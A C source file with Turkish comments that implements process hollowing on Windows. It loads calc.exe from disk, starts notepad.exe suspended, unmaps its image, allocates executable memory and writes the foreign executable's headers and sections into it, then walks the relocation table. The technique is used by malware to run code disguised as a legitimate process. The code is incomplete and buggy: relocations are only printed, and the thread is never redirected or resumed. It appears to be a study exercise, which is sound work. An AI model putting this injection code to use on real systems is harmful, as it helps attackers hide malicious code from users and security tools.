#include <stdio.h>
#include <stdlib.h>
#include <Windows.h>
#include <winternl.h>
#include <string.h>

typedef NTSTATUS(NTAPI* PNtQueryInformationProcess)(
	IN HANDLE ProcessHandle,
	IN PROCESSINFOCLASS ProcessInformationClass,
	OUT PVOID ProcessInformation,
	IN ULONG ProcessInformationLength,
	OUT PULONG ReturnLength OPTIONAL);



typedef NTSTATUS(WINAPI* PNtUnmapViewOfSection)(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress);

void main() {
	char file[] = "C:\\Windows\\SysWOW64\\calc.exe";

	/*
		Disk uzerinde depolanmis dosyaya ulasmak icin HANDLE degeri al.
	*/
	HANDLE HFile = CreateFileA(
		(LPCSTR)file,
		GENERIC_READ,
		FILE_SHARE_READ,
		NULL,
		OPEN_EXISTING,
		FILE_ATTRIBUTE_READONLY,
		NULL);

	if (HFile == INVALID_HANDLE_VALUE)
	{
		printf("Dosya acilamadi!");
		exit(EXIT_FAILURE);
	}
	/*
		Dosya boyutunu al.
	*/
	DWORD fileSize = GetFileSize(
		HFile, 
		NULL);

	if (fileSize == INVALID_FILE_SIZE)
	{
		printf("Dosya boyutu alinamadi!");
		exit(EXIT_FAILURE);
	}

	/*
		Heap'den dosya boyutu kadar yer tahsis et ve bu alani sifirla doldur.
	*/
	LPVOID baseAddr = HeapAlloc(
		GetProcessHeap(), 
		HEAP_ZERO_MEMORY, 
		fileSize);

	if (!baseAddr)
	{
		printf("Dosya icin Heap'den yer tahsis edilemedi!");
		exit(EXIT_FAILURE);
	}
	/*
		Heap'den tahsis edilen alana disk uzerindeki dosyayi kopyala.
	*/
	LPDWORD NumberOfBytesRead = 0;

	ReadFile(
		HFile, 
		baseAddr, 
		fileSize, 
		NumberOfBytesRead, 
		NULL);

	/*
		Durdurulmus (SUSPENDED) modda yeni bir process baslat ve process bilgilerini(pi) al.
	*/

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	// 32 bit process olusturursan ImageBaseAddress Peb'de +8, 64 bit olusturursan +10 da yer alir.
	if (!CreateProcessA(
		NULL,
		(LPSTR)"c:\\windows\\syswow64\\notepad.exe",
		NULL,
		NULL,
		FALSE,
		CREATE_SUSPENDED,
		NULL,
		NULL,
		&si,
		&pi )
	)
	{
		printf("CreateProcess failed.");
		exit(EXIT_FAILURE);
	}

	/*
		Gerekli fonksiyonlari yukle.
	*/
	HANDLE HTargetProcess = pi.hProcess;
	DWORD targetProcessId = pi.dwProcessId;

	printf("Hedef process id: %d\n", targetProcessId);

	PNtQueryInformationProcess NtQueryInformationProcess = GetProcAddress(LoadLibraryA((LPCSTR)"ntdll.dll"), (LPCSTR)"NtQueryInformationProcess");
	PNtUnmapViewOfSection NtUnmapViewOfSection = GetProcAddress(LoadLibraryA((LPCSTR)"ntdll.dll"), (LPCSTR)"NtUnmapViewOfSection");

	/*
		Hedef process'in Image Base adresini bul.
	*/
	PROCESS_BASIC_INFORMATION pbi;

	NtQueryInformationProcess(
		HTargetProcess, 
		ProcessBasicInformation, 
		&pbi, 
		sizeof(PROCESS_BASIC_INFORMATION), 
		NULL);

	PPEB PebBaseAddress = pbi.PebBaseAddress;
	DWORD targetImageBaseAddr = (DWORD)PebBaseAddress + 8;
	
	ReadProcessMemory(
		HTargetProcess, 
		(LPCVOID)(targetImageBaseAddr), 
		&targetImageBaseAddr, 
		4, 
		NULL);
	
	printf("Hedef Image Base Adresi: %p\n", targetImageBaseAddr);

	/*
		Hedef process'in Virtual Address Space'inden internal memory object'ini sil.
		Ayrinti icin : https://stackoverflow.com/questions/53344161/why-does-zwunmapviewofsection-unmap-the-memory-of-the-whole-process-when-give
	*/

	NtUnmapViewOfSection(
		HTargetProcess, 
		(PVOID)targetImageBaseAddr);

	/*
		Image boyutunu al.
	*/
	PIMAGE_DOS_HEADER DOSHeader = (PIMAGE_DOS_HEADER)baseAddr;
	PIMAGE_NT_HEADERS NTHeader = (PIMAGE_NT_HEADERS)((DWORD)baseAddr + DOSHeader->e_lfanew);
	
	DWORD imageSize = NTHeader->OptionalHeader.SizeOfImage;

	/*
		Unmapped edilmis bolgeyi tahsis et. 
	*/
	VirtualAllocEx(
		HTargetProcess, 
		(LPVOID)targetImageBaseAddr, 
		imageSize, 
		MEM_COMMIT | MEM_RESERVE, 
		PAGE_EXECUTE_READWRITE);

	/*
		Hedef process'de tahsis edilen alana yeni image base'i guncelleyerek sectionlar haric tum headerler kopyalanir.
		Disk uzerindeki dosyanin image base'ini hedef process'in image base'ine guncellersek ve bu aradaki farki 
		hesaplayip sabit adresleri guncellersek, zaten halihazirda hedefde var olan image base adrese kopyalama
		islemi yapacagimiz icin adresler bu image base'e gore guncellenmis olacak ve threadi calistirdigimizda
		sikinti cikmayacaktir.
	*/

	DWORD totalHeaderSize = NTHeader->OptionalHeader.SizeOfHeaders,
		delta = targetImageBaseAddr - NTHeader->OptionalHeader.ImageBase,
		numberOfBytesWritten = NULL;

	NTHeader->OptionalHeader.ImageBase = targetImageBaseAddr;

	if ((WriteProcessMemory(
		HTargetProcess,
		(LPVOID)targetImageBaseAddr,
		(LPCVOID)baseAddr,
		totalHeaderSize,
		&numberOfBytesWritten )) == 0
		)
	{
		printf("Headerlar hedefe yazilamadi.");
		exit(EXIT_FAILURE);
	}
	else
	{
		printf("%d baytin %d'i hedefe yazildi.\n", totalHeaderSize, numberOfBytesWritten);
	}

	/*
		Disk uzerindeki sectionlari hedefe su maddelere dikkat ederek yaz:
			1-) Disk uzerinde bu sectionlar PointerToRawData offsetlerinde baslar
			2-) Hedefe kopyalarken section alignment mevzusundan dolayi VirtualAddress'e
			gore islem yapilmalidir.
			NOT: VirtualAddressler image base'e gore referans alinmalidir (Microsoft dokumantasyonuna gore)
	*/

	PIMAGE_SECTION_HEADER SECTIONHeader = (PIMAGE_SECTION_HEADER)((DWORD)NTHeader + sizeof(IMAGE_NT_HEADERS));

	PIMAGE_SECTION_HEADER oldSECTIONHeader = SECTIONHeader;


	WORD numberOfSections = NTHeader->FileHeader.NumberOfSections;

	DWORD sectionHeaderTableOffset = 0, numberOfBytesToRead = 0;

	PIMAGE_BASE_RELOCATION relocTable = NULL;

	for (WORD i = 0; i < numberOfSections; i++) {
		SECTIONHeader = (PIMAGE_SECTION_HEADER)((DWORD)oldSECTIONHeader + sectionHeaderTableOffset);
		//printf("Section Name: %s\n", SECTIONHeader->Name);
		numberOfBytesToRead = SECTIONHeader->SizeOfRawData;
		LPCVOID sectionBaseAddr = (LPCVOID)((DWORD)baseAddr + SECTIONHeader->PointerToRawData);
		LPVOID destSectionBaseAddr = (LPVOID)((DWORD)targetImageBaseAddr + SECTIONHeader->VirtualAddress);

		if ((strcmp(SECTIONHeader->Name, ".reloc") == 0))
		{
			relocTable = (PIMAGE_BASE_RELOCATION)sectionBaseAddr;
		}
		
		if ((WriteProcessMemory(
			HTargetProcess,
			destSectionBaseAddr,
			sectionBaseAddr,
			numberOfBytesToRead,
			&numberOfBytesWritten)) == 0
			)
		{
			printf("%s section'i hedefe yazilamadi.", SECTIONHeader->Name);
			exit(EXIT_FAILURE);
		}
		else
		{
			printf("%s section'in %d baytinin %d'si hedefe yazildi.\n", SECTIONHeader->Name, SECTIONHeader->SizeOfRawData, numberOfBytesWritten);
		}

		sectionHeaderTableOffset += sizeof(IMAGE_SECTION_HEADER);
	}

	/*
		Sabit Adresleri guncelle
	*/
	DWORD
		relocTableRVA = NTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress,
		relocTableSize = NTHeader->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size,
		relocTableEntryOffset = sizeof(IMAGE_BASE_RELOCATION),
		PageRVA, numberOfEntries, relocTableOffset = PageRVA = numberOfEntries = 0;
		

	const WORD 
			first4bit = 0xF000,  // 1111000000000000
			last12bit = 0xFFF; // 0000111111111111
	
	WORD TYPE, OFFSET;
	LPWORD ENTRY;
	
	if (relocTable && delta)
	{
		while (relocTableOffset != relocTableSize)
		{
			relocTableOffset += relocTable->SizeOfBlock;
			PageRVA = relocTable->VirtualAddress;
			relocTableEntryOffset = sizeof(DWORD) * 2,

			numberOfEntries = (relocTable->SizeOfBlock - 8) / sizeof(WORD);
			ENTRY = (LPWORD)((DWORD)relocTable + relocTableEntryOffset);

			for (int i = 1; i < numberOfEntries+1; i++)
			{
				relocTableEntryOffset = sizeof(WORD);
				TYPE = *ENTRY & first4bit;
				OFFSET = *ENTRY & last12bit;

				if (TYPE)
					printf("type:%x\toffset:%x\n", TYPE, OFFSET);

				ENTRY = (LPWORD)((DWORD)relocTable + relocTableEntryOffset * i);
			}

			// Bir sonraki bloga gec.
			relocTable = (DWORD)relocTable + relocTable->SizeOfBlock;
		}
		
	}
} 
